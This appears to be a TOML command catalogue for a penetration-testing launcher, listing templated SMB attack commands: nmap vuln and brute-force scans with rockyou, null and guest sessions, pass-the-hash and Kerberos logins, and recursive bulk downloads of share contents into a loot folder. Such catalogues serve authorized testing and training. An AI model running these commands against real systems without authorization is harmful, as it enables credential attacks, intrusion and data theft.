category = "smb"
display_name = "SMB"
icon = ""
order = 20

# Placeholders (`:variable` or `chronosphere variables set …`):
#   share=SHARE_NAME   remote_path=\\path\\to\\file   local_path=./loot
#   userlist=users.txt   wordlist=/usr/share/wordlists/rockyou.txt
#   spray_password=Spring2026!   — spray pass (not the same as cred profile {password})
#   new_password / computer_password — see ad-chains.toml header
#
# smbclient auth quick ref:
#   guest/null  → -N  or  -U '' -N  or  -U 'guest%'
#   user+pass   → -U 'DOMAIN\\user%password'  (or {smb_user_spec} from cred profile)
#   NTLM hash   → -U 'DOMAIN\\user' --pw-nt-hash {nt_hash}
#   Kerberos    → -k -U 'user@domain'

# === Recon / port scan ===

[[command]]
id = "smb.nmap.smb_scripts"
title = "nmap — SMB enum scripts (445)"
template = "nmap -p 445 -Pn --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-protocols {target}"
requires = ["nmap"]
tags = ["recon", "nmap", "enum"]

[[command]]
id = "smb.nmap.smb_vuln"
title = "nmap — SMB vuln scripts"
template = "nmap -p 445 -Pn --script smb-vuln* {target}"
requires = ["nmap"]
tags = ["recon", "nmap", "vuln"]

[[command]]
id = "smb.nmap.smb_signing"
title = "nmap — smb-security-mode (signing)"
template = "nmap -p 445 -Pn --script smb-security-mode {target}"
requires = ["nmap"]
tags = ["recon", "nmap", "signing"]

[[command]]
id = "smb.nmap.smb_brute"
title = "nmap — smb-brute (noisy)"
template = "nmap -p 445 -Pn --script smb-brute --script-args smbuser=users.txt,smbpass=/usr/share/wordlists/rockyou.txt {target}"
requires = ["nmap"]
tags = ["recon", "nmap", "brute", "noisy"]

# === smbclient — authentication ===

[[command]]
id = "smb.smbclient.list_guest"
title = "smbclient -L (guest / no password)"
template = "smbclient -L //{target} -N"
requires = ["smbclient"]
tags = ["enum", "shares", "unauth", "guest"]
when = "creds.kind in ['none','plaintext','ntlm','kerberos']"

[[command]]
id = "smb.smbclient.list_null"
title = "smbclient -L (null session)"
template = "smbclient -L //{target} -U '' -N"
requires = ["smbclient"]
tags = ["enum", "shares", "unauth", "null"]

[[command]]
id = "smb.smbclient.list_guest_explicit"
title = "smbclient -L (explicit guest user)"
template = "smbclient -L //{target} -U 'guest%'"
requires = ["smbclient"]
tags = ["enum", "shares", "guest"]

[[command]]
id = "smb.smbclient.list_authed"
title = "smbclient -L (authenticated — profile creds)"
template = "smbclient -L //{target} -U '{smb_user_spec}'"
requires = ["smbclient"]
tags = ["enum", "shares", "authed"]
when = "creds.kind in ['plaintext','ntlm']"

[[command]]
id = "smb.smbclient.list_user_pass"
title = "smbclient -L (user + password explicit)"
template = "smbclient -L //{target} -U '{domain_user}%{password}'"
requires = ["smbclient"]
tags = ["enum", "shares", "authed"]
when = "creds.kind == 'plaintext'"

[[command]]
id = "smb.smbclient.list_hash"
title = "smbclient -L (pass-the-hash)"
template = "smbclient -L //{target} -U '{domain_user}' --pw-nt-hash {nt_hash}"
requires = ["smbclient"]
tags = ["enum", "shares", "pth"]
when = "creds.kind == 'ntlm'"

[[command]]
id = "smb.smbclient.list_kerberos"
title = "smbclient -L (Kerberos ticket)"
template = "smbclient -L //{target} -k -U '{user_at_domain}'"
requires = ["smbclient"]
tags = ["enum", "shares", "kerberos"]
when = "creds.kind == 'kerberos'"

[[command]]
id = "smb.smbclient.interactive_guest"
title = "smbclient — interactive shell (guest, share)"
template = "smbclient //{target}/{share} -N"
requires = ["smbclient"]
tags = ["interactive", "guest", "share"]
interactive = true

[[command]]
id = "smb.smbclient.interactive_null"
title = "smbclient — interactive shell (null session)"
template = "smbclient //{target}/{share} -U '' -N"
requires = ["smbclient"]
tags = ["interactive", "null", "share"]
interactive = true

[[command]]
id = "smb.smbclient.interactive_authed"
title = "smbclient — interactive shell (authenticated)"
template = "smbclient //{target}/{share} -U '{smb_user_spec}'"
requires = ["smbclient"]
tags = ["interactive", "authed", "share"]
interactive = true
when = "creds.kind in ['plaintext','ntlm']"

[[command]]
id = "smb.smbclient.interactive_hash"
title = "smbclient — interactive shell (pass-the-hash)"
template = "smbclient //{target}/{share} -U '{domain_user}' --pw-nt-hash {nt_hash}"
requires = ["smbclient"]
tags = ["interactive", "pth", "share"]
interactive = true
when = "creds.kind == 'ntlm'"

[[command]]
id = "smb.smbclient.interactive_kerberos"
title = "smbclient — interactive shell (Kerberos)"
template = "smbclient //{target}/{share} -k -U '{user_at_domain}'"
requires = ["smbclient"]
tags = ["interactive", "kerberos", "share"]
interactive = true
when = "creds.kind == 'kerberos'"

# === smbclient — list & download ===

[[command]]
id = "smb.smbclient.ls_guest"
title = "smbclient — list share root (guest)"
template = "smbclient //{target}/{share} -N -c 'ls'"
requires = ["smbclient"]
tags = ["enum", "guest", "share"]

[[command]]
id = "smb.smbclient.ls_authed"
title = "smbclient — list share root (authenticated)"
template = "smbclient //{target}/{share} -U '{smb_user_spec}' -c 'ls'"
requires = ["smbclient"]
tags = ["enum", "authed", "share"]
when = "creds.kind in ['plaintext','ntlm']"

[[command]]
id = "smb.smbclient.recurse_list"
title = "smbclient — recursive dir listing (prompt recurse)"
template = "smbclient //{target}/{share} -U '{smb_user_spec}' -c 'recurse; ls'"
requires = ["smbclient"]
tags = ["enum", "share", "recursive"]
when = "creds.kind in ['plaintext','ntlm','none']"

[[command]]
id = "smb.smbclient.get_file"
title = "smbclient — download single file"
template = "smbclient //{target}/{share} -U '{smb_user_spec}' -D {local_path} -c 'get {remote_path}'"
requires = ["smbclient"]
tags = ["download", "share"]
when = "creds.kind in ['plaintext','ntlm','none']"

[[command]]
id = "smb.smbclient.mget_recursive"
title = "smbclient — recursive download (mget *)"
template = "smbclient //{target}/{share} -U '{smb_user_spec}' -D {local_path} -c 'prompt OFF; recurse; mget *'"
requires = ["smbclient"]
tags = ["download", "share", "recursive"]
when = "creds.kind in ['plaintext','ntlm','none']"

[[command]]
id = "smb.smbclient.tar_download"
title = "smbclient — tar mode bulk download"
template = "smbclient //{target}/{share} -U '{smb_user_spec}' -Tc {local_path} {remote_path}"
requires = ["smbclient"]
tags = ["download", "share", "bulk"]
when = "creds.kind in ['plaintext','ntlm','none']"

[[command]]
id = "smb.smbclient.mount_cifs"
title = "mount.cifs — mount readable share locally"
template = "sudo mkdir -p /mnt/{share} && sudo mount -t cifs //{target}/{share} /mnt/{share} -o username={user},password='{password}',domain={domain},vers=3.0"
requires = ["mount"]
tags = ["mount", "download", "share"]
when = "creds.kind == 'plaintext'"

# === smbmap ===

[[command]]
id = "smb.smbmap.guest"
title = "smbmap — share permissions (guest)"
template = "smbmap -H {target} -u 'guest' -p ''"
requires = ["smbmap"]
tags = ["enum", "shares", "guest"]

[[command]]
id = "smb.smbmap.null"
title = "smbmap — share permissions (null session)"
template = "smbmap -H {target} -u '' -p ''"
requires = ["smbmap"]
tags = ["enum", "shares", "null"]

[[command]]
id = "smb.smbmap.shares"
title = "smbmap — share permissions (authenticated)"
template = "smbmap -H {target} -u '{user}' -p '{password}' -d '{domain}'"
requires = ["smbmap"]
tags = ["enum", "shares", "authed"]
when = "creds.kind == 'plaintext'"

[[command]]
id = "smb.smbmap.recursive"
title = "smbmap — recursive listing (-R)"
template = "smbmap -H {target} -u '{user}' -p '{password}' -d '{domain}' -R {share}"
requires = ["smbmap"]
tags = ["enum", "share", "recursive"]
when = "creds.kind == 'plaintext'"

[[command]]
id = "smb.smbmap.download"
title = "smbmap — download file from share"
template = "smbmap -H {target} -u '{user}' -p '{password}' -d '{domain}' --download {remote_path} -s {share}"
requires = ["smbmap"]
tags = ["download", "share"]
when = "creds.kind == 'plaintext'"

[[command]]
id = "smb.smbmap.download_dir"
title = "smbmap — download directory (-A)"
template = "smbmap -H {target} -u '{user}' -p '{password}' -d '{domain}' -A {share} -r {remote_path}"
requires = ["smbmap"]
tags = ["download", "share", "recursive"]
when = "creds.kind == 'plaintext'"

